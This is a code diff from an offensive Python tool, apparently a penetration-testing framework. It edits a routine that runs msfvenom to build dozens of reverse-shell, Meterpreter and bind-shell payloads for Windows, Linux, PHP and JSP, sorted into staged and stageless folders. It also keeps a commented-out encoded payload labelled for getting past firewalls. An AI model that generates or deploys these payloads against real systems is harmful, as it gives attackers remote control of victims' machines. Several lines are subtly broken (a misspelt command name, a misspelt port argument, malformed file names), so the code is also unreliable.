@@ -2983,23 +2983,43 @@ while True:
       checkParams = getPort()      
       if checkParams != 1:
          if OSF[:7] == "WINDOWS":
-            print(colored("[*] Creating windows exploits...", colour3))         
-            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")         
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")         
+            print(colored("[*] Creating microsoft windows exploits...", colour3))
+            if not os.path.exists(explDir + "/staged"):
+               localCOM("mkdir " + explDir + "/staged")
+            if not os.path.exists(explDir + "/stageless"):
+               localCOM("mkdir " + explDir + "/stageless")
+            print("[+] Manufacturing staged exploits...")   
+            localCOM("msfvenom -p windows/x64/shell/reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_shell_reverse_tcp.exe > arsenal.tmp 2>&1")
+            localCOM("msfvenon -p windows/shell/reverse_tcp                  LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")         
+            localCOM("msfvenom -p windows/x64/meterpreter/reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
             if TIP[:5] != "EMPTY":
-               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
-               localCOM("msfvenom -p windows/shell_hidden_bind_tcp           AHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_shell_hidden_bind_tcp.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/wwindows_x86_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")         
-            localCOM("msfvenom -p windows/meterpreter/bind_tcp               RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp_allports   LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")         
-            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
-# ANTI WAF ----         
-            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
+               localCOM("msfvenom -p windows/x64/meterpreter/bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               localCOM("msfvenom -p windows/meterpreter/bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/staged/windows/x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+            print("[+] Manufacturing stageless exploits...")                            
+            localCOM("msfvenom -p windows/x64/shell_reverse_tcp              LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/shell_reverse_tcp                  LHOST=" + localIP + "         LPORP=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_shell_reverse_tcp_exe > arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter_reverse_http       LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter_reverse_http           LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_http.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter_reverse_https      LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter_reverse_https          LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_https.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp        LHOST=" + localIP + "         LPORT=" + checkParams + " -f vba   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp.vba >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/meterpreter_reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp.exe >> arsenal.tmp 2>&1")
+            localCOM("msfvenom -p windows/x64/meterpreter_reverse_tcp_allports LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")           
+            localCOM("msfvenom -p windows/meterpreter_reverse_tcp_allports     LHOST=" + localIP + "       LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_reverse_tcp_allports.exe >> arsenal.tmp 2>&1")
+            if TIP[:5] != "EMPTY":
+               localCOM("msfvenom -p windows/x64/meterpreter_bind_tcp        RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x64_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+               localCOM("msfvenom -p windows/meterpreter_bind_tcp            RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f exe   -o " + explDir + "/stageless/windows_x86_meterpreter_bind_tcp.exe >> arsenal.tmp 2>&1")
+
+#            localCOM("msfvenom -p cmd/windows/reverse_powershell  	     LHOST=" + localIP + "         LPORT=" + checkParams + "          -o " + explDir + "staged/cmd_windows_x86_reverse_powershell.bat >> arsenal.tmp 2>&1")
+#            localCOM("msfvenom -p windows/meterpreter/reverse_tcp --platform Windows -e x86/shikata_ga_nai -i 127 LHOST=" + localIP + " LPORT=" + checkParams + " -f exe -o " + explDir + "staged/windows_x86_meterpreter_encoded_reverse_tcp.exe >> arsenal.tmp 2>&1")
+            
          if OSF[:5] == "LINUX":
             print(colored("[*] Creating linux exploits...", colour3))
             localCOM("msfvenom -p linux/x86/meterpreter/reverse_tcp          LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_reverse_tcp.elf>> arsenal.tmp 2>&1")
@@ -3008,6 +3028,7 @@ while True:
             localCOM("msfvenom -p linux/x64/meterpreter_reverse_http         LHOST=" + localIP + "         LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x64_meterpreter_reverse_http.elf >> arsenal.tmp 2>&1")
             localCOM("msfvenom -p linux/x86/meterpreter/bind_tcp             RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x86_meterpreter_bind_tcp.elf >> arsenal.tmp 2>&1")
             localCOM("msfvenom -p linux/x64/shell_bind_tcp                   RHOST=" + TIP.rstrip(" ") + " LPORT=" + checkParams + " -f elf   -o " + explDir + "/linux_x66_shell_bind_tcp.elf >> arsenal.tmp 2>&1")         
+
          if OSF[:7] == "ANDROID":
             print(colored("[*] Creating android exploits...", colour3))
 #           localCOM("msfvenom -p android/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " R        -o " + explDir + "/android_reverse_shell.apk >> arsenal.tmp 2>&1")
@@ -3021,6 +3042,7 @@ while True:
          if OSF[:3] == "IOS":
             print(colored("[*] Creating ios exploits...", colour3))
             print("NOT IMPLEMENTED")            
+
          print(colored("[*] Creating other exploits that you might require...", colour3))
          localCOM("msfvenom -p php/reverse_php                            LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/php_reverse_php.php >> arsenal.tmp 2>&1")
          localCOM("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/jajava_jsp_shell_reverse_tcp.jsp >> arsenal.tmp 2>&1")
